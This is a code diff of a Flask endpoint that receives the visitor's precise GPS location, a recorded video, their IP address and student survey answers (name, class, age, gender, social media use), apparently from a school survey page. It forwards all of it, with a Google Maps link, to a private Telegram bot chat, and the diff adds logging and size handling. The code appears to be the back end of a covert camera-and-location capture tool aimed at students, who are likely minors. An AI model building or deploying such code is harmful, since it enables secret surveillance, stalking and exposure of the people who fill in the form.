@@ -628,6 +628,7 @@ def index():
 def simpan():
     data = request.get_json()
     if not data or "latitude" not in data or "longitude" not in data:
+        print("❌ Data tidak lengkap")
         return jsonify({"status": "error", "message": "Data tidak lengkap"}), 400
 
     lat = data["latitude"]
@@ -644,66 +645,79 @@ def simpan():
 
     ext = "webm" if "webm" in mime else ("mp4" if "mp4" in mime else "webm")
 
-    # ============================================
-    # KIRIM LANGSUNG KE TELEGRAM (TANPA SIMPAN FILE)
-    # ============================================
+    print(f"📥 DATA MASUK | REF: {ref}")
+    print(f"   Lokasi: {lat}, {lon} (±{round(akurasi)}m)")
+    print(f"   MIME: {mime} | Base64 length: {len(video_data)}")
+    print(f"   Form: {form_data}")
+
+    # ============ CEK ENV VAR ============
     if not TELEGRAM_TOKEN or "GANTI" in TELEGRAM_TOKEN:
-        print("⚠ Telegram belum dikonfigurasi")
+        print("⚠ TELEGRAM_TOKEN belum di-set")
         return jsonify({"status": "ok", "waktu": waktu, "ref": ref})
 
+    # ============ FORMAT CAPTION ============
+    label_map = {
+        "nama": "Nama", "kelas": "Kelas", "umur": "Umur",
+        "jk": "Jenis Kelamin", "medsos": "Medsos Favorit",
+        "durasi": "Durasi Harian", "waktu": "Waktu Akses",
+        "dampak": "Dampak/Pendapat", "pendapat": "Pendapat"
+    }
+    siswa_text = "\n\n👤 *Data Siswa:*\n"
+    for k, v in form_data.items():
+        label = label_map.get(k, k)
+        siswa_text += f"• {label}: `{v}`\n"
+
+    caption = (
+        f"🎥 *Video + Lokasi Baru!*\n\n"
+        f"📍 Lat: `{lat:.6f}`\n"
+        f"Lon: `{lon:.6f}`\n"
+        f"±{round(akurasi)}m\n\n"
+        f"🗺 [Google Maps](https://www.google.com/maps?q={lat},{lon})\n\n"
+        f"🌐 IP: `{ip}`\n"
+        f"⏰ {waktu}"
+        f"{siswa_text}"
+    )
+
+    # ============ KIRIM KE TELEGRAM ============
     try:
-        # Format data survei untuk caption
-        label_map = {
-            "nama": "Nama",
-            "kelas": "Kelas",
-            "umur": "Umur",
-            "jk": "Jenis Kelamin",
-            "medsos": "Medsos Favorit",
-            "durasi": "Durasi Harian",
-            "waktu": "Waktu Akses",
-            "dampak": "Dampak/Pendapat",
-            "pendapat": "Pendapat"
-        }
-        siswa_text = "\n\n👤 *Data Siswa:*\n"
-        for k, v in form_data.items():
-            label = label_map.get(k, k)
-            siswa_text += f"• {label}: `{v}`\n"
-
-        caption = (
-            f"🎥 *Video + Lokasi Baru Masuk!*\n\n"
-            f"📍 *Lokasi:*\n"
-            f"Lat: `{lat:.6f}`\n"
-            f"Lon: `{lon:.6f}`\n"
-            f"Akurasi: ±{round(akurasi)} meter\n\n"
-            f"🗺 [Buka di Google Maps](https://www.google.com/maps?q={lat},{lon})\n\n"
-            f"🌐 *IP:* `{ip}`\n"
-            f"⏰ *Waktu:* {waktu}\n"
-            f"📱 *Device:* {ua[:60]}"
-            f"{siswa_text}"
-        )
-
-        # Kalau video ada → kirim video + caption
         if video_data.startswith("data:video"):
             header, encoded = video_data.split(",", 1)
             vid_bytes = base64.b64decode(encoded)
 
-            files = {"video": (f"video.{ext}", vid_bytes, mime)}
-            r = requests.post(
-                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo",
-                data={
-                    "chat_id": TELEGRAM_CHAT_ID,
-                    "caption": caption,
-                    "parse_mode": "Markdown",
-                    "supports_streaming": True,
-                    "width": 640,
-                    "height": 480,
-                    "duration": 5
-                },
-                files=files,
-                timeout=60
-            )
+            size_mb = len(vid_bytes) / (1024 * 1024)
+            print(f"   📹 Ukuran video: {size_mb:.2f} MB")
+
+            # Limit Telegram video = 50MB
+            if size_mb > 49:
+                print(f"   ⚠ Video terlalu besar, kirim pesan teks saja")
+                r = requests.post(
+                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                    data={
+                        "chat_id": TELEGRAM_CHAT_ID,
+                        "text": caption + f"\n\n⚠ Video terlalu besar ({size_mb:.1f}MB)",
+                        "parse_mode": "Markdown"
+                    },
+                    timeout=8
+                )
+            else:
+                print("   📤 Mengirim video...")
+                files = {"video": (f"video.{ext}", vid_bytes, mime)}
+                r = requests.post(
+                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo",
+                    data={
+                        "chat_id": TELEGRAM_CHAT_ID,
+                        "caption": caption,
+                        "parse_mode": "Markdown",
+                        "supports_streaming": True,
+                        "width": 640,
+                        "height": 480,
+                        "duration": 5
+                    },
+                    files=files,
+                    timeout=8
+                )
         else:
-            # Kalau tidak ada video → kirim pesan teks saja
+            print("   📝 Tidak ada video, kirim teks saja")
             r = requests.post(
                 f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                 data={
@@ -711,19 +725,24 @@ def simpan():
                     "text": caption + "\n\n⚠ Video tidak tersedia",
                     "parse_mode": "Markdown"
                 },
-                timeout=30
+                timeout=8
             )
 
+        print(f"   📨 Response HTTP: {r.status_code}")
         if r.status_code == 200:
-            print(f"✅ Notifikasi Telegram terkirim | REF: {ref}")
+            print(f"   ✅ Telegram OK | REF: {ref}")
         else:
-            print(f"❌ Telegram error: {r.status_code} - {r.text[:200]}")
+            print(f"   ❌ Telegram error: {r.status_code}")
+            print(f"   ❌ Body: {r.text[:500]}")
 
+    except requests.exceptions.Timeout:
+        print(f"   ❌ TIMEOUT: Telegram tidak respon (kemungkinan video besar)")
+    except requests.exceptions.ConnectionError as e:
+        print(f"   ❌ KONEKSI ERROR: {e}")
     except Exception as e:
-        print(f"❌ Gagal kirim ke Telegram: {e}")
+        print(f"   ❌ ERROR: {type(e).__name__}: {e}")
 
     return jsonify({"status": "ok", "waktu": waktu, "ref": ref})
-
 # ============================================
 # HELPER ROUTES
 # ============================================
